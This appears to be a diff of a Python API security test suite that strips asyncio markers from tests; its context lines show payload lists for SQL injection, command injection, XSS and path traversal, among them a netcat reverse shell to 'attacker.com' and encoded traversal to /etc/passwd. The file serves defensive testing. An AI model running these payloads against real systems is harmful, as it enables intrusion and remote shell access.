@@ -24,7 +24,6 @@ class TestSQLInjection:
         "1; SELECT pg_sleep(5)--",
     ]
 
-    @pytest.mark.asyncio
     async def test_target_name_sql_injection(self, test_client):
         """SQL injection in target name should be safely handled."""
         for payload in self.SQL_INJECTION_PAYLOADS:
@@ -41,7 +40,6 @@ class TestSQLInjection:
             assert response.status_code in (200, 201, 400, 422), \
                 f"Unexpected status {response.status_code} for SQL payload in name"
 
-    @pytest.mark.asyncio
     async def test_search_query_sql_injection(self, test_client):
         """SQL injection in search queries should be safely handled."""
         for payload in self.SQL_INJECTION_PAYLOADS:
@@ -62,7 +60,6 @@ class TestSQLInjection:
             assert response.status_code in (200, 400, 422), \
                 f"Unexpected status {response.status_code} for SQL payload in filter"
 
-    @pytest.mark.asyncio
     async def test_uuid_parameter_sql_injection(self, test_client):
         """SQL injection in UUID parameters should be safely handled."""
         for payload in self.SQL_INJECTION_PAYLOADS:
@@ -87,7 +84,6 @@ class TestCommandInjection:
         "| nc -e /bin/sh attacker.com 4444",
     ]
 
-    @pytest.mark.asyncio
     async def test_target_path_command_injection(self, test_client):
         """Command injection in target paths should be safely handled."""
         for payload in self.COMMAND_INJECTION_PAYLOADS:
@@ -105,7 +101,6 @@ class TestCommandInjection:
             assert response.status_code in (200, 201, 400, 403, 422), \
                 f"Unexpected status {response.status_code} for command injection payload"
 
-    @pytest.mark.asyncio
     async def test_filename_command_injection(self, test_client):
         """Command injection in filenames should be prevented."""
         for payload in self.COMMAND_INJECTION_PAYLOADS:
@@ -132,7 +127,6 @@ class TestXSSPrevention:
         "<iframe src='javascript:alert(1)'>",
     ]
 
-    @pytest.mark.asyncio
     async def test_target_name_xss_stored(self, test_client):
         """XSS payloads in target names should be safely stored and returned."""
         for payload in self.XSS_PAYLOADS:
@@ -153,7 +147,6 @@ class TestXSSPrevention:
                 assert "application/json" in response.headers.get("content-type", ""), \
                     "Response should be JSON to prevent XSS execution"
 
-    @pytest.mark.asyncio
     async def test_api_returns_json_content_type(self, test_client):
         """API responses should have JSON content type to prevent XSS."""
         endpoints = [
@@ -183,7 +176,6 @@ class TestPathTraversalInAPI:
         "..%252f..%252f..%252fetc/passwd",
     ]
 
-    @pytest.mark.asyncio
     async def test_target_config_path_traversal(self, test_client):
         """Path traversal in target config should be prevented."""
         for payload in self.PATH_TRAVERSAL_PAYLOADS:
@@ -205,7 +197,6 @@ class TestPathTraversalInAPI:
 class TestJSONInjection:
     """Tests for JSON injection attacks."""
 
-    @pytest.mark.asyncio
     async def test_json_pollution_in_config(self, test_client):
         """JSON pollution attacks in config should be prevented."""
         pollution_payloads = [
@@ -227,7 +218,6 @@ class TestJSONInjection:
             # but test anyway for defense in depth
             assert response.status_code in (200, 201, 400, 422)
 
-    @pytest.mark.asyncio
     async def test_deeply_nested_json(self, test_client):
         """Deeply nested JSON should not cause DoS."""
         # Create deeply nested JSON (potential DoS)
@@ -251,7 +241,6 @@ class TestJSONInjection:
 class TestHeaderInjection:
     """Tests for HTTP header injection."""
 
-    @pytest.mark.asyncio
     async def test_crlf_in_redirect_parameter(self, test_client):
         """CRLF injection in redirect parameters should be prevented."""
         crlf_payloads = [
@@ -277,7 +266,6 @@ class TestHeaderInjection:
 class TestLogInjection:
     """Tests for log injection prevention."""
 
-    @pytest.mark.asyncio
     async def test_newline_in_user_input_sanitized(self, test_client):
         """Newlines in user input should not corrupt logs."""
         log_injection_payloads = [
@@ -303,7 +291,6 @@ class TestLogInjection:
 class TestMassAssignment:
     """Tests for mass assignment vulnerabilities."""
 
-    @pytest.mark.asyncio
     async def test_cannot_set_tenant_id_via_api(self, test_client):
         """Users should not be able to set tenant_id via API."""
         other_tenant_id = str(uuid4())
@@ -324,7 +311,6 @@ class TestMassAssignment:
             assert target_data.get("tenant_id") != other_tenant_id, \
                 "Mass assignment allowed setting tenant_id!"
 
-    @pytest.mark.asyncio
     async def test_cannot_set_id_via_api(self, test_client):
         """Users should not be able to set resource id via API."""
         malicious_id = str(uuid4())
